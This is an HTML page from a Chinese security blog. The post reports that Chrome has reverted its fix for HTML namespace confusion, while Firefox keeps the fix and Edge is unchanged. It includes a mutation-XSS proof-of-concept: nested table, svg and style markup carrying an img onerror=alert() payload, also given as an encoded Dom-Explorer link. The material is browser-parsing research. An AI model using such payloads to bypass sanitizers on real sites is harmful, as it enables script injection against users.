@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="7月31号我的博客更新了一篇文章展示了浏览器如何修复了命名空间混淆，而后我并未再研究过相关内容，而最近偶然又发现浏览器回退了修改 可以看看这段html在不同浏览器的解析情况 1234567891011&lt;table&gt;  &lt;caption&gt;    &lt;svg&gt;      &lt;title&gt;        &lt;table&gt;&lt;&#x2F;table&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命名空间混淆又被浏览器改回来了">
+<meta property="og:url" content="https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/index.html">
+<meta property="og:site_name" content="le0n&#39;s blogs">
+<meta property="og:description" content="7月31号我的博客更新了一篇文章展示了浏览器如何修复了命名空间混淆，而后我并未再研究过相关内容，而最近偶然又发现浏览器回退了修改 可以看看这段html在不同浏览器的解析情况 1234567891011&lt;table&gt;  &lt;caption&gt;    &lt;svg&gt;      &lt;title&gt;        &lt;table&gt;&lt;&#x2F;table&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/1605464f3937c764716585c3da5b1b7a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/77a0af9d3ec755453a63074320523c07.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/9ab52638052c5ae2106916f7ce19f3ba.png">
+<meta property="article:published_time" content="2025-09-25T13:55:47.000Z">
+<meta property="article:modified_time" content="2025-09-25T13:55:38.497Z">
+<meta property="article:author" content="le0n">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/1605464f3937c764716585c3da5b1b7a.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>命名空间混淆又被浏览器改回来了</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y7V18M7XFP"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Y7V18M7XFP');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/31/xss%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9A%97%E6%94%B9%E4%BA%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&text=命名空间混淆又被浏览器改回来了"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&is_video=false&description=命名空间混淆又被浏览器改回来了"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=命名空间混淆又被浏览器改回来了&body=Check out this article: https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&name=命名空间混淆又被浏览器改回来了&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&t=命名空间混淆又被浏览器改回来了"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        命名空间混淆又被浏览器改回来了
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">le0n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-25T13:55:47.000Z" class="dt-published" itemprop="datePublished">2025-09-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>7月31号我的博客更新了一篇文章展示了浏览器如何修复了命名空间混淆，而后我并未再研究过相关内容，而最近偶然又发现浏览器回退了修改</p>
+<p>可以看看这段html在不同浏览器的解析情况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">  &lt;caption&gt;</span><br><span class="line">    &lt;svg&gt;</span><br><span class="line">      &lt;title&gt;</span><br><span class="line">        &lt;table&gt;&lt;/table&gt;</span><br><span class="line">		&lt;caption&gt;&lt;/caption&gt;</span><br><span class="line">      &lt;/title&gt;</span><br><span class="line">      &lt;style&gt;&lt;a id=<span class="string">&quot;&lt;/style&gt;&lt;img src=x onerror=alert()&gt;&quot;</span>&gt;&lt;/a&gt;&lt;/style&gt;</span><br><span class="line">    &lt;/svg&gt;</span><br><span class="line">  &lt;/caption&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接在不同浏览器访问这段url</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//yeswehack.github.io/Dom-Explorer/#eyJpbnB1dCI6Ijx0YWJsZT5cbiAgPGNhcHRpb24+XG4gICAgPHN2Zz5cbiAgICAgIDx0aXRsZT5cbiAgICAgICAgPHRhYmxlPjwvdGFibGU+XG5cdFx0PGNhcHRpb24+PC9jYXB0aW9uPlxuICAgICAgPC90aXRsZT5cbiAgICAgIDxzdHlsZT48YSBpZD1cIjwvc3R5bGU+PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCk+XCI+PC9hPjwvc3R5bGU+XG4gICAgPC9zdmc+XG4gIDwvY2FwdGlvbj5cbjwvdGFibGU+XG5cbiIsInBpcGVsaW5lcyI6W3siaWQiOiJkd3J6OHRmcCIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiI0cWcxYmR0OCIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到chrome已经回退了修复（可能是因为造成的某些预期外影响？不太清楚）</p>
+<p><img src="/images/1605464f3937c764716585c3da5b1b7a.png"></p>
+<p>而firefox保留着之前的修复–限制其被弹出命名空间</p>
+<p><img src="/images/77a0af9d3ec755453a63074320523c07.png"></p>
+<p>edge仍是未做处理</p>
+<p><img src="/images/9ab52638052c5ae2106916f7ce19f3ba.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/friends">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&text=命名空间混淆又被浏览器改回来了"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&is_video=false&description=命名空间混淆又被浏览器改回来了"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=命名空间混淆又被浏览器改回来了&body=Check out this article: https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&title=命名空间混淆又被浏览器改回来了"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&name=命名空间混淆又被浏览器改回来了&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/09/25/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86%E5%8F%88%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%B9%E5%9B%9E%E6%9D%A5%E4%BA%86/&t=命名空间混淆又被浏览器改回来了"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    le0n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+<!--抽象小广告：-->
+<script>
+  // 根据时间动态设置问候语
+  function updateGreeting() {
+    const hour = new Date().getHours();
+    let greeting = "你好";
+
+    if (hour >= 5 && hour < 12) {
+      greeting = "早上好";
+    } else if (hour >= 12 && hour < 18) {
+      greeting = "下午好";
+    } else if (hour >= 18 && hour < 24) {
+      greeting = "傍晚好";
+    } else {
+      greeting = "深夜好";
+    }
+
+    const welcomeSpan = document.getElementById("greeting");
+    if (welcomeSpan) {
+      welcomeSpan.innerText = greeting;
+    }
+  }
+  document.addEventListener("DOMContentLoaded", function () {
+    updateGreeting();
+  });
+</script>
+<div id="fixLayout" style="width: 100%;"><div id="qz_notification" class="msg-channel-wrapper" style="right: 1px; z-index: 6500; width: 321px; position: fixed; bottom: 5px;">
+    <div class="msg-channel" data-itemid="2740651">
+      <div class="hd">
+        <p class="user-info">
+          <span id="greeting" class="welcome">傍晚好</span>
+          <span id="ip" class="name textoverflow">ctfer</span><a href="https://www.yuque.com/le0n/" target="_blank" title="点击查看ctf特权详情" class="qz_vip_icon_s qz_vip_icon_s_gray_1 "></a>            </p>
+
+      </div>
+      <div class="bd">
+        <!-- 整片可点击 -->
+        <a href="https://www.yuque.com/le0n/" target="_blank" data-hook="reportClick" class="inner clearfix">
+          <img src="https://tianshu.gtimg.cn/tianshu/1740386625176.gif" class="privilege-img" alt="游戏特权推广图">
+
+          <div class="privilege-content">
+            <h3 class="title">ctf霸业</h3>
+
+            <p class="desp">满屏光柱超变传奇</p>
+            <span class="btn-get" title="点击开始">点击开始</span>
+
+          </div>
+        </a>
+      </div>
+    </div>
+    <!-- 操作按钮 -->
+    <a class="op-icon icon-setting" data-hook="showSetup" href="javascript:void(0)" title="弹窗设置"></a>
+    <a class="op-icon icon-close" data-hook="closeTips" href="javascript:void(0)" title="关闭"></a>
+    <!-- 分割线 -->
+    <span class="op-icon-split"></span>
+
+    <!-- 浮层 -->
+    <div class="ui-dialog ui-light-dialog ui-light-dialog-s ui-popover ui-popover-top-right" id="qz_notification_config" style="display:none">
+      <div class="ui-dl-inner">
+        <b class="ui-dl-arrow ui-dl-arrow1"></b>
+        <b class="ui-dl-arrow ui-dl-arrow2"></b>
+
+        <div class="ui-dl-hd">
+          <div class="qz-grid">
+            <div class="qz-right"><a href="javascript:void(0);" data-hook="shutDown" class="close" title="关闭"><s class="ui-icon sp-dialog-close"></s></a></div>
+          </div>
+        </div>
+        <div class="ui-dl-bd">
+          <p class="j_qz_notification_config_select" data-hook="selectThis" data-index="0"><label for=""><input type="radio" name="show_mod" class="none" value="0"><i class="ui-icon qz-radio-on"></i>每日登录时自动显示一次</label></p>
+
+          <p class="j_qz_notification_config_select" data-hook="selectThis" data-index="1"><label for=""><input type="radio" name="show_mod" class="none" value="1"><i class="ui-icon qz-radio"></i>从不自动显示</label>
+          </p>
+        </div>
+        <div class="ui-dl-ft">
+          <div class="qz-grid">
+            <div class="qz-right actions">
+              <a class="qz-button qz-dark-button" data-hook="sendOk" href="javascript:void(0);"><span class="txt">确定</span></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div></div></div>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
